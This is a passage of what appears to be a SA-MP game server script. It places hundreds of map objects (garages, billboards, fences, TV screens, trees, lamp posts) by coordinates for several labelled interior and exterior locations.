	CreateDynamicObject_e(1850,554.29998779,-1257.59997559,16.20000076,0.00000000,0.00000000,30.00000000); //object(shop_shelf08) (1)
	CreateDynamicObject_e(1850,557.09997559,-1256.00000000,16.20000076,0.00000000,0.00000000,29.99816895); //object(shop_shelf08) (2)
	CreateDynamicObject_e(1850,559.90002441,-1254.40002441,16.20000076,0.00000000,0.00000000,29.99816895); //object(shop_shelf08) (3)
	CreateDynamicObject_e(4640,561.40002441,-1254.19995117,17.89999962,0.00000000,0.00000000,20.00000000); //object(paypark_lan03) (1)
	CreateDynamicObject_e(1250,559.20001221,-1255.59997559,16.79999924,0.00000000,0.00000000,300.00000000); //object(smashbarpost) (1)
	CreateDynamicObject_e(1483,522.09997559,-1292.30004883,18.20000076,0.00000000,0.00000000,90.00000000); //object(dyn_garrage2) (1)
	CreateDynamicObject_e(1483,528.79998779,-1292.19995117,18.20000076,0.00000000,0.00000000,90.00000000); //object(dyn_garrage2) (2)
	CreateDynamicObject_e(1483,535.50000000,-1292.19995117,18.20000076,0.00000000,0.00000000,90.00000000); //object(dyn_garrage2) (3)
	CreateDynamicObject_e(1483,542.19921875,-1292.19921875,18.20000076,0.00000000,0.00000000,90.00000000); //object(dyn_garrage2) (4)
	CreateDynamicObject_e(1483,548.89941406,-1292.09960938,18.20000076,0.00000000,0.00000000,90.00000000); //object(dyn_garrage2) (5)
	CreateDynamicObject_e(1483,544.59997559,-1267.00000000,18.20000076,0.00000000,0.00000000,305.50000000); //object(dyn_garrage2) (7)
	CreateDynamicObject_e(1483,539.09997559,-1270.90002441,18.20000076,0.00000000,0.00000000,305.49682617); //object(dyn_garrage2) (8)
	CreateDynamicObject_e(1483,533.59997559,-1275.00000000,18.20000076,0.00000000,0.00000000,307.49682617); //object(dyn_garrage2) (9)
	CreateDynamicObject_e(1483,528.20001221,-1279.09997559,18.20000076,0.00000000,0.00000000,307.49633789); //object(dyn_garrage2) (10)
	CreateDynamicObject_e(1483,522.79998779,-1283.30004883,18.20000076,0.00000000,0.00000000,307.49633789); //object(dyn_garrage2) (11)
	CreateDynamicObject_e(1260,559.09960938,-1298.79980469,30.29999924,0.00000000,0.00000000,251.65832520); //object(billbd3) (2)
	CreateDynamicObject_e(4731,560.29998779,-1299.50000000,35.50000000,0.00000000,0.00000000,191.75000000); //object(billbrdlan2_05) (1)
	CreateDynamicObject_e(4731,559.90002441,-1299.90002441,35.50000000,0.00000000,0.00000000,11.74987793); //object(billbrdlan2_05) (2)
	CreateDynamicObject_e(8322,545.40002441,-1313.00000000,20.00000000,0.00000000,0.00000000,344.00000000); //object(vgsbboardsigns08) (1)
	CreateDynamicObject_e(10281,542.50000000,-1293.50000000,28.60000038,0.00000000,0.00000000,180.00000000); //object(michsign_sfe) (1)
	CreateDynamicObject_e(18454,518.20001221,-1299.30004883,15.89999962,0.00000000,0.00000000,0.00000000); //object(cs_detrok02) (1)
	CreateDynamicObject_e(18454,518.20001221,-1299.30004883,19.29999924,0.00000000,0.00000000,0.00000000); //object(cs_detrok02) (2)
	CreateDynamicObject_e(18454,518.09997559,-1299.30004883,22.70000076,0.00000000,0.00000000,0.00000000); //object(cs_detrok02) (4)
	CreateDynamicObject_e(18454,566.40002441,-1299.09997559,22.70000076,0.00000000,0.00000000,0.00000000); //object(cs_detrok02) (9)
	CreateDynamicObject_e(18454,566.40002441,-1299.09997559,19.20000076,0.00000000,0.00000000,0.00000000); //object(cs_detrok02) (10)
	CreateDynamicObject_e(18454,566.40002441,-1299.09997559,15.69999981,0.00000000,0.00000000,0.00000000); //object(cs_detrok02) (11)
	CreateDynamicObject_e(10558,556.50000000,-1294.40002441,18.20000076,0.00000000,0.00000000,270.00000000); //object(tbnsfs) (1)
	CreateDynamicObject_e(18458,556.59997559,-1294.30004883,24.29999924,0.00000000,0.00000000,270.00000000); //object(cs_detrok06) (1)
	CreateDynamicObject_e(18458,556.59997559,-1294.30004883,20.79999924,0.00000000,0.00000000,270.00000000); //object(cs_detrok06) (2)
	CreateDynamicObject_e(18458,556.59997559,-1294.30004883,17.29999924,0.00000000,0.00000000,270.00000000); //object(cs_detrok06) (3)
	CreateDynamicObject_e(18454,564.70001221,-1294.40002441,19.60000038,270.00000000,180.00000000,270.00000000); //object(cs_detrok02) (12)
	CreateDynamicObject_e(18454,561.20001221,-1294.40002441,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (13)
	CreateDynamicObject_e(18454,550.09997559,-1294.40002441,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (14)
	CreateDynamicObject_e(18454,546.59997559,-1294.40002441,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (15)
	CreateDynamicObject_e(18454,543.20001221,-1294.30004883,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (17)
	CreateDynamicObject_e(18454,539.70001221,-1294.30004883,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (18)
	CreateDynamicObject_e(18454,536.20001221,-1294.30004883,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (19)
	CreateDynamicObject_e(18454,532.70001221,-1294.30004883,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (20)
	CreateDynamicObject_e(18454,529.29998779,-1294.30004883,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (21)
	CreateDynamicObject_e(18454,525.79998779,-1294.30004883,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (22)
	CreateDynamicObject_e(18454,522.29998779,-1294.40002441,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (23)
	CreateDynamicObject_e(18454,519.50000000,-1294.40002441,19.60000038,270.00000000,179.99450684,270.00000000); //object(cs_detrok02) (24)
	CreateDynamicObject_e(1566,562.29998779,-1294.30004883,17.70000076,0.00000000,0.00000000,0.00000000); //object(cj_ws_door) (1)
	CreateDynamicObject_e(1566,565.40002441,-1294.30004883,17.70000076,0.00000000,0.00000000,180.00000000); //object(cj_ws_door) (2)

	//                          GROTTI INT                        //
	CreateDynamicObject_e(10249,-941.59997559,1938.90002441,38.00000000,0.00000000,0.00000000,220.00000000); //object(ottos_bits) (1)
	CreateDynamicObject_e(10249,-957.90002441,1921.19995117,38.00000000,0.00000000,0.00000000,39.99572754); //object(ottos_bits) (2)
	CreateDynamicObject_e(10008,-935.50000000,1943.90002441,32.70000076,0.00000000,0.00000000,190.00000000); //object(fer_cars2_sfe) (1)
	CreateDynamicObject_e(10008,-964.09997559,1916.00000000,32.70000076,0.00000000,0.00000000,339.99755859); //object(fer_cars2_sfe) (2)
	CreateDynamicObject_e(10009,-963.79998779,1915.80004883,38.70000076,0.00000000,0.00000000,340.25000000); //object(fer_cars3_sfe) (1)
	CreateDynamicObject_e(10009,-935.90002441,1943.80004883,38.70000076,0.00000000,0.00000000,190.24658203); //object(fer_cars3_sfe) (2)
	CreateDynamicObject_e(18461,-963.29998779,1933.09997559,43.09999847,90.00000000,180.00000000,204.00048828); //object(cs_detrok09) (1)
	CreateDynamicObject_e(18461,-964.70001221,1936.19995117,43.09999847,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (2)
	CreateDynamicObject_e(18461,-964.70001221,1936.19995117,33.50000000,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (3)
	CreateDynamicObject_e(18461,-963.29998779,1933.09997559,33.50000000,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (4)
	CreateDynamicObject_e(18461,-963.29998779,1933.09997559,23.89999962,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (5)
	CreateDynamicObject_e(18461,-964.70001221,1936.19995117,23.89999962,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (6)
	CreateDynamicObject_e(18461,-936.50000000,1926.69995117,23.89999962,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (7)
	CreateDynamicObject_e(18461,-935.09997559,1923.50000000,23.89999962,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (8)
	CreateDynamicObject_e(18461,-935.09997559,1923.50000000,33.50000000,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (9)
	CreateDynamicObject_e(18461,-936.50000000,1926.69995117,33.50000000,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (10)
	CreateDynamicObject_e(18461,-936.50000000,1926.69995117,43.09999847,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (11)
	CreateDynamicObject_e(18461,-935.09997559,1923.50000000,43.09999847,90.00000000,179.99450684,203.99963379); //object(cs_detrok09) (12)
	CreateDynamicObject_e(1566,-963.00000000,1932.80004883,29.39999962,0.00000000,0.00000000,113.24707031); //object(cj_ws_door) (2)
	CreateDynamicObject_e(1566,-964.29998779,1935.69995117,29.39999962,0.00000000,0.00000000,293.24707031); //object(cj_ws_door) (3)

	//                      FLIA. ITALIANA                      //
	CreateDynamicObject(3749,836.90002441,-1929.09997559,17.70000076,0.00000000,0.00000000,0.00000000); //object(clubgate01_lax) (1)
	CreateDynamicObject(985,823.50000000,-1929.00000000,13.60000038,0.00000000,0.00000000,0.00000000); //object(gate_autor) (2)
	CreateDynamicObject(985,849.40002441,-1928.80004883,13.60000038,0.00000000,0.00000000,0.00000000); //object(gate_autor) (3)
	CreateDynamicObject(3606,836.59997559,-2056.69995117,15.30000019,0.00000000,0.00000000,180.00000000); //object(bevbrkhus1) (1)
	CreateDynamicObject(16362,845.00000000,-2020.00000000,15.00000000,0.00000000,0.00000000,0.00000000); //object(desn2_tscanopy) (1)
	CreateDynamicObject(16362,845.00000000,-1979.19995117,15.00000000,0.00000000,0.00000000,0.00000000); //object(desn2_tscanopy) (2)
	CreateDynamicObject(3753,811.90002441,-2015.19995117,3.40000010,0.00000000,0.00000000,90.00000000); //object(dockwall_las2) (1)
	CreateDynamicObject(987,816.00000000,-1989.09997559,2.59999990,0.00000000,0.00000000,180.00000000); //object(elecfence_bar) (1)
	CreateDynamicObject(987,804.09997559,-1989.09997559,2.59999990,0.00000000,0.00000000,269.99450684); //object(elecfence_bar) (2)
	CreateDynamicObject(3749,805.70001221,-2010.80004883,8.19999981,0.00000000,0.00000000,90.00000000); //object(clubgate01_lax) (2)
	CreateDynamicObject(987,803.90002441,-2020.69995117,2.59999990,0.00000000,0.00000000,269.98901367); //object(elecfence_bar) (3)
	CreateDynamicObject(987,804.00000000,-2032.69995117,2.59999990,0.00000000,0.00000000,359.98901367); //object(elecfence_bar) (4)
	CreateDynamicObject(987,816.00000000,-2032.80004883,2.59999990,0.00000000,0.00000000,89.98352051); //object(elecfence_bar) (5)
	CreateDynamicObject(8378,821.09997559,-2009.59997559,1.29999995,0.00000000,0.00000000,90.00000000); //object(vgsbighngrdoor) (1)

	//                          LSTV INT.                           //
	CreateDynamicObject(14393,1272.80004883,-832.40002441,1046.19995117,0.00000000,0.00000000,0.00000000); //object(dr_gsnew09) (1)
	CreateDynamicObject(14392,1272.90002441,-832.50000000,1045.30004883,0.00000000,0.00000000,0.00000000); //object(dr_gsnew08) (1)
	CreateDynamicObject(14391,1272.69995117,-833.40002441,1044.90002441,0.00000000,0.00000000,0.00000000); //object(dr_gsnew07) (1)
	CreateDynamicObject(2632,1264.09997559,-831.29998779,1045.90002441,0.00000000,90.00000000,0.00000000); //object(gym_mat02) (1)
	CreateDynamicObject(2631,1264.09997559,-833.29998779,1045.50000000,0.00000000,90.00000000,0.00000000); //object(gym_mat1) (1)
	CreateDynamicObject(2632,1264.09997559,-835.29998779,1045.90002441,0.00000000,90.00000000,0.00000000); //object(gym_mat02) (2)
	CreateDynamicObject(2631,1264.09997559,-829.29998779,1045.50000000,0.00000000,90.00000000,0.00000000); //object(gym_mat1) (2)
	CreateDynamicObject(2648,1264.00000000,-831.70001221,1045.90002441,0.00000000,0.00000000,88.00000000); //object(cj_steal_tv) (1)
	CreateDynamicObject(2648,1264.00000000,-831.70001221,1046.69995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (2)
	CreateDynamicObject(2648,1264.00000000,-830.90002441,1046.69995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (3)
	CreateDynamicObject(2648,1264.00000000,-830.90002441,1045.90002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (4)
	CreateDynamicObject(2648,1264.00000000,-830.90002441,1045.19995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (5)
	CreateDynamicObject(2648,1264.00000000,-831.70001221,1045.19995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (6)
	CreateDynamicObject(2648,1264.00000000,-831.70001221,1044.40002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (7)
	CreateDynamicObject(2648,1264.00000000,-830.90002441,1044.40002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (8)
	CreateDynamicObject(3851,1272.09997559,-835.90002441,1045.69995117,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (2)
	CreateDynamicObject(2648,1264.00000000,-832.79998779,1046.69995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (9)
	CreateDynamicObject(2648,1264.00000000,-833.59997559,1046.69995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (10)
	CreateDynamicObject(2648,1264.00000000,-833.59997559,1045.90002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (11)
	CreateDynamicObject(2648,1264.00000000,-832.79998779,1045.90002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (12)
	CreateDynamicObject(2648,1264.00000000,-832.79998779,1045.09997559,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (13)
	CreateDynamicObject(2648,1264.00000000,-833.59997559,1045.09997559,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (14)
	CreateDynamicObject(2648,1264.00000000,-833.59997559,1044.40002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (15)
	CreateDynamicObject(2648,1264.00000000,-832.79998779,1044.40002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (16)
	CreateDynamicObject(1502,1272.09997559,-828.70001221,1044.00000000,0.00000000,0.00000000,270.00000000); //object(gen_doorint04) (1)
	CreateDynamicObject(1967,1272.09997559,-827.20001221,1045.50000000,0.00000000,0.00000000,0.00000000); //object(imcmptrkdrr_las) (1)
	CreateDynamicObject(1671,1274.30004883,-832.00000000,1044.40002441,0.00000000,0.00000000,260.00000000); //object(swivelchair_a) (1)
	CreateDynamicObject(1671,1274.40002441,-834.29998779,1044.40002441,0.00000000,0.00000000,289.99694824); //object(swivelchair_a) (2)
	CreateDynamicObject(1704,1276.30004883,-834.79998779,1044.00000000,0.00000000,0.00000000,90.00000000); //object(kb_chair03) (1)
	CreateDynamicObject(1704,1276.30004883,-832.70001221,1044.00000000,0.00000000,0.00000000,90.00000000); //object(kb_chair03) (2)
	CreateDynamicObject(2946,1281.40002441,-834.29998779,1044.00000000,0.00000000,0.00000000,0.00000000); //object(cr_door_03) (1)
	CreateDynamicObject(2946,1281.40002441,-831.20001221,1044.00000000,0.00000000,0.00000000,180.00000000); //object(cr_door_03) (2)
	CreateDynamicObject(1967,1281.59997559,-833.40002441,1045.50000000,270.00000000,180.00000000,180.00000000); //object(imcmptrkdrr_las) (2)
	CreateDynamicObject(1967,1281.59997559,-830.59997559,1045.50000000,270.00000000,179.99450684,179.99450684); //object(imcmptrkdrr_las) (3)
	CreateDynamicObject(2648,1264.00000000,-834.79998779,1046.69995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (17)
	CreateDynamicObject(2648,1264.00000000,-835.59997559,1046.69995117,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (18)
	CreateDynamicObject(2648,1264.00000000,-835.59997559,1045.90002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (19)
	CreateDynamicObject(2648,1264.00000000,-834.79998779,1045.90002441,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (20)
	CreateDynamicObject(2648,1264.00000000,-834.79998779,1045.09997559,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (21)
	CreateDynamicObject(2648,1264.00000000,-835.59997559,1045.09997559,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (22)
	CreateDynamicObject(2648,1264.00000000,-835.59997559,1044.30004883,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (23)
	CreateDynamicObject(2648,1264.00000000,-834.90002441,1044.30004883,0.00000000,0.00000000,87.99499512); //object(cj_steal_tv) (24)
	CreateDynamicObject(1704,1267.09997559,-832.29998779,1044.00000000,0.00000000,0.00000000,64.00000000); //object(kb_chair03) (3)
	CreateDynamicObject(1704,1267.40002441,-833.79998779,1044.00000000,0.00000000,0.00000000,109.49536133); //object(kb_chair03) (4)
	CreateDynamicObject(2946,732.00000000,-1350.69995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(cr_door_03) (3)
	CreateDynamicObject(2946,732.00000000,-1347.50000000,12.60000038,0.00000000,0.00000000,180.00000000); //object(cr_door_03) (4)

	//                      	LSTV  EXT.              				//
	CreateDynamicObject(3660,764.19921875,-1331.00000000,14.39999962,0.00000000,0.00000000,358.74755859); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,742.09997559,-1330.80004883,14.39999962,0.00000000,0.00000000,1.25000000); //object(lasairfbed_las) (2)
	CreateDynamicObject(1360,753.20001221,-1330.50000000,13.30000019,0.00000000,0.00000000,90.00000000); //object(cj_bush_prop3) (1)
	CreateDynamicObject(1360,753.20001221,-1331.50000000,13.30000019,0.00000000,0.00000000,90.00000000); //object(cj_bush_prop3) (2)
	CreateDynamicObject(982,746.20001221,-1332.30004883,13.19999981,0.00000000,0.00000000,90.50000000); //object(fenceshit) (1)
	CreateDynamicObject(984,765.50000000,-1332.40002441,13.19999981,0.00000000,0.00000000,88.75000000); //object(fenceshit2) (2)
	CreateDynamicObject(982,781.90002441,-1343.50000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit) (2)
	CreateDynamicObject(982,781.90002441,-1369.09997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit) (3)
	CreateDynamicObject(3509,784.39941406,-1379.00000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_r01) (2)
	CreateDynamicObject(3509,784.50000000,-1368.00000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_r01) (3)
	CreateDynamicObject(3509,784.79980469,-1358.00000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_r01) (4)
	CreateDynamicObject(3509,784.59960938,-1347.50000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_r01) (5)
	CreateDynamicObject(3509,784.40002441,-1337.00000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_r01) (6)
	CreateDynamicObject(3472,783.09997559,-1343.50000000,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (1)
	CreateDynamicObject(3472,783.79980469,-1353.50000000,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (2)
	CreateDynamicObject(3472,783.79980469,-1362.79980469,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (3)
	CreateDynamicObject(3472,783.79998779,-1373.59997559,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (4)
	CreateDynamicObject(3508,759.90002441,-1331.50000000,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (2)
	CreateDynamicObject(3508,771.40002441,-1331.69995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (3)
	CreateDynamicObject(3508,765.70001221,-1331.59997559,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (4)
	CreateDynamicObject(3508,755.20001221,-1331.40002441,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (5)
	CreateDynamicObject(3508,750.00000000,-1331.30004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (6)
	CreateDynamicObject(3508,744.00000000,-1331.19995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (7)
	CreateDynamicObject(3508,738.79998779,-1331.09997559,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (8)
	CreateDynamicObject(3508,734.29998779,-1331.00000000,13.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (9)
	CreateDynamicObject(3472,768.20001221,-1332.19995117,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (5)
	CreateDynamicObject(3472,757.70001221,-1331.69995117,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (6)
	CreateDynamicObject(3472,747.20001221,-1331.59997559,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (7)
	CreateDynamicObject(3472,741.50000000,-1331.89941406,7.30000019,0.00000000,0.00000000,90.00000000); //object(circuslampost03) (8)
	CreateDynamicObject(5837,771.20001221,-1379.09997559,14.19999981,0.00000000,0.00000000,270.00000000); //object(ci_guardhouse1) (1)
	CreateDynamicObject(1251,757.70001221,-1335.40002441,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (1)
	CreateDynamicObject(984,754.20001221,-1338.59997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (3)
	CreateDynamicObject(1251,757.70001221,-1338.59997559,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (2)
	CreateDynamicObject(1251,757.70001221,-1341.80004883,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,757.70001221,-1345.00000000,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (4)
	CreateDynamicObject(1251,757.59997559,-1332.30004883,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (5)
	CreateDynamicObject(1251,750.70001221,-1345.00000000,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (6)
	CreateDynamicObject(1251,750.70001221,-1341.80004883,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (7)
	CreateDynamicObject(1251,750.70001221,-1336.90002441,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (9)
	CreateDynamicObject(1251,750.70001221,-1332.30004883,12.60000038,0.00000000,0.00000000,270.00000000); //object(smashbar) (10)
	CreateDynamicObject(1251,734.40002441,-1335.90002441,12.60000038,0.00000000,0.00000000,0.00000000); //object(smashbar) (11)
	CreateDynamicObject(1251,738.20001221,-1335.90002441,12.60000038,0.00000000,0.00000000,0.00000000); //object(smashbar) (12)
	CreateDynamicObject(1251,741.39941406,-1335.89941406,12.60000038,0.00000000,0.00000000,0.00000000); //object(smashbar) (13)
	CreateDynamicObject(2924,754.79998779,-1383.09997559,13.89999962,0.00000000,0.00000000,90.00000000); //object(kmb_crash3door) (1)
	CreateDynamicObject(10150,754.50000000,-1382.09960938,26.70000076,0.00000000,0.00000000,0.00000000); //object(fdorsfe) (1)
	CreateDynamicObject(10150,750.40002441,-1382.19995117,26.70000076,0.00000000,0.00000000,0.00000000); //object(fdorsfe) (2)
	CreateDynamicObject(10150,752.40002441,-1380.09997559,26.70000076,0.00000000,0.00000000,90.00000000); //object(fdorsfe) (3)
	CreateDynamicObject(10150,752.50000000,-1384.19995117,26.70000076,0.00000000,0.00000000,90.00000000); //object(fdorsfe) (4)
	CreateDynamicObject(10150,752.40002441,-1382.19995117,28.70000076,0.00000000,90.00000000,0.00000000); //object(fdorsfe) (5)
	CreateDynamicObject(2924,750.29998779,-1382.69995117,25.89999962,0.00000000,0.00000000,90.00000000); //object(kmb_crash3door) (2)
	CreateDynamicObject(3660,782.70001221,-1340.30004883,14.39999962,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,785.20001221,-1340.30004883,14.39999962,0.00000000,0.00000000,270.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,785.20001221,-1359.90002441,14.39999962,0.00000000,0.00000000,270.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,782.70001221,-1359.90002441,14.39999962,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,783.20001221,-1374.90002441,14.39999962,0.00000000,0.00000000,270.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,784.29998779,-1290.19995117,14.39999962,0.00000000,0.00000000,270.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,784.50000000,-1375.19995117,14.39999962,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(7952,734.09997559,-1328.90002441,13.30000019,0.00000000,0.00000000,90.00000000); //object(miragehedge09) (1)
	CreateDynamicObject(7952,691.70001221,-1328.80004883,13.30000019,0.00000000,0.00000000,90.00000000); //object(miragehedge09) (2)
	CreateDynamicObject(982,761.20001221,-1327.80004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit) (4)
	CreateDynamicObject(982,735.59997559,-1327.80004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit) (5)
	CreateDynamicObject(982,710.00000000,-1327.80004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit) (6)
	CreateDynamicObject(982,684.40002441,-1327.80004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit) (7)
	CreateDynamicObject(982,660.40002441,-1327.80004883,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit) (8)
	CreateDynamicObject(3472,721.50000000,-1329.90002441,7.30000019,0.00000000,0.00000000,270.00000000); //object(circuslampost03) (8)
	CreateDynamicObject(3472,698.90002441,-1329.80004883,7.30000019,0.00000000,0.00000000,270.00000000); //object(circuslampost03) (8)
	CreateDynamicObject(3472,678.40002441,-1330.00000000,7.30000019,0.00000000,0.00000000,270.00000000); //object(circuslampost03) (8)
	CreateDynamicObject(3472,657.79998779,-1329.59997559,7.30000019,0.00000000,0.00000000,270.00000000); //object(circuslampost03) (8)
	CreateDynamicObject(16613,-239.00000000,1783.09997559,99.09999847,0.00000000,0.00000000,44.99450684); //object(des_bigtelescope) (1)
	CreateDynamicObject(3763,721.50000000,-1372.59997559,61.29999924,0.00000000,0.00000000,0.00000000); //object(ce_radarmast3) (1)
	CreateDynamicObject(14537,757.00000000,-1364.90002441,14.50000000,0.00000000,0.00000000,0.00000000); //object(pdomesbar) (1)
	CreateDynamicObject(1594,762.09997559,-1371.80004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(chairsntable) (1)
	CreateDynamicObject(1594,765.00000000,-1368.19995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(chairsntable) (2)
	CreateDynamicObject(1594,765.00000000,-1361.40002441,13.00000000,0.00000000,0.00000000,0.00000000); //object(chairsntable) (4)
	CreateDynamicObject(1594,765.90002441,-1364.19995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(chairsntable) (5)
	CreateDynamicObject(1594,763.20001221,-1357.80004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(chairsntable) (8)
	CreateDynamicObject(1670,762.20001221,-1371.90002441,13.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (1)
	CreateDynamicObject(1670,765.00000000,-1368.30004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (2)
	CreateDynamicObject(1670,765.79998779,-1364.40002441,13.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (3)
	CreateDynamicObject(1670,764.90002441,-1361.50000000,13.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (4)
	CreateDynamicObject(1670,763.20001221,-1358.00000000,13.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (5)
	CreateDynamicObject(2008,770.79998779,-1377.09997559,12.80000019,0.00000000,0.00000000,0.00000000); //object(officedesk1) (1)
	CreateDynamicObject(3851,647.50000000,-1377.59997559,14.80000019,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (1)
	CreateDynamicObject(3851,647.50000000,-1377.59997559,18.79999924,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (3)
	CreateDynamicObject(3851,647.40002441,-1372.00000000,14.80000019,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (4)
	CreateDynamicObject(3851,647.50000000,-1366.30004883,18.70000076,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (5)
	CreateDynamicObject(3851,647.50000000,-1355.00000000,18.70000076,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (6)
	CreateDynamicObject(3851,647.70001221,-1334.80004883,18.70000076,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (7)
	CreateDynamicObject(3851,647.70001221,-1346.00000000,18.70000076,0.00000000,0.00000000,359.75000000); //object(carshowwin_sfsx) (8)
	CreateDynamicObject(3851,647.70001221,-1334.80004883,14.69999981,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (9)
	CreateDynamicObject(3851,647.70001221,-1343.19995117,14.69999981,0.00000000,0.00000000,359.75000000); //object(carshowwin_sfsx) (10)
	CreateDynamicObject(1597,645.29998779,-1338.69995117,15.10000038,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (1)
	CreateDynamicObject(1597,646.00000000,-1377.30004883,15.19999981,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (2)
	CreateDynamicObject(10150,754.59997559,-1382.50000000,14.69999981,0.00000000,0.00000000,0.00000000); //object(fdorsfe) (1)
	CreateDynamicObject(10150,754.70001221,-1382.80004883,14.60000038,0.00000000,0.00000000,0.00000000); //object(fdorsfe) (1)
